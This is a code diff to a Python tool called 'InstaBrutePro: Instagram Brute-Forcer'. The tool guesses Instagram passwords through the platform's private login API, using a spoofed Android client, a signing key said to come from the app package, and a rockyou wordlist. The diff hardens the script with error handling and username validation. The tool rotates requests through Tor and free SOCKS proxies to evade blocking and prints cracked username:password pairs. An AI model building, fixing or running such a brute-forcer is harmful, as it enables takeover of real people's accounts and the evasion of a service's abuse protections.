@@ -23,7 +23,7 @@ TOR_PORTS = CONFIG['tor_ports']
 LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
 UA = "Instagram 350.0.0.21.114 Android (34/14; 560dpi; 1440x3120; samsung; SM-S928B; dm3q; exynos5400; en_US; 350000000000000)"
 APP_ID = "567067343352427"
-SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # HMAC key (from APK)
+SIG_KEY = "686a36310a594a8f4a2f3c1d5b4b5a5e"  # Update from APK if needed
 
 # Global
 found = False
@@ -34,14 +34,17 @@ def get_proxies():
     proxies = []
     for port in TOR_PORTS:
         proxies.append(f"socks5://127.0.0.1:{port}")
-    # Add free proxies from file (sorted/tested)
-    with open('proxies/free_proxies.txt', 'r') as f:
-        for line in f:
-            line = line.strip()
-            if line:
-                proxies.append(f"socks5://{line}")
-    random.shuffle(proxies)  # Rotate
-    return proxies[:200]  # Limit
+    # Add free proxies
+    try:
+        with open('proxies/free_proxies.txt', 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line:
+                    proxies.append(f"socks5://{line}")
+    except FileNotFoundError:
+        pass
+    random.shuffle(proxies)
+    return proxies[:200]
 
 def sort_proxies(proxies):
     working = []
@@ -101,7 +104,7 @@ def try_password(username, password, proxy, csrf):
     signed = sign_payload(payload)
     try:
         resp = session.post(LOGIN_URL, data=signed, timeout=10)
-        time.sleep(DELAY + random.uniform(0, 0.5))  # Random delay + backoff
+        time.sleep(DELAY + random.uniform(0, 0.5))
         if '"authenticated":true' in resp.text:
             with lock:
                 print(f"[+] CRACKED! {username}:{password}")
@@ -132,7 +135,7 @@ def worker(queue, username, proxies, csrf):
 
 def main():
     global resume_line
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(description="InstaBrutePro: Instagram Brute-Forcer")
     parser.add_argument('-u', required=True, help='Username')
     parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist')
     parser.add_argument('-t', type=int, default=THREADS, help='Threads')
@@ -143,13 +146,16 @@ def main():
 
     # Validate user
     import subprocess
-    subprocess.run(['python', 'validate_user.py', args.u])
+    result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
+    if "Valid" not in result.stdout:
+        print("[-] Invalid username. Exiting.")
+        return
 
     # Load wordlist
     with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
         words = [line.strip() for line in f if line.strip()]
     if args.r:
-        resume_line = int(input("Resume from line: ")) or 0
+        resume_line = int(input("Resume from line: ") or 0)
         words = words[resume_line:]
 
     # Proxies
@@ -160,7 +166,7 @@ def main():
         proxies = sort_proxies(proxies)
     print(f"[+] Loaded {len(words)} pw, {len(proxies)} proxies, {args.t} threads")
 
-    # CSRF (fetch fresh)
+    # CSRF
     csrf = get_csrf(random.choice(proxies))
     if not csrf:
         print("[-] Failed CSRF - Retry")
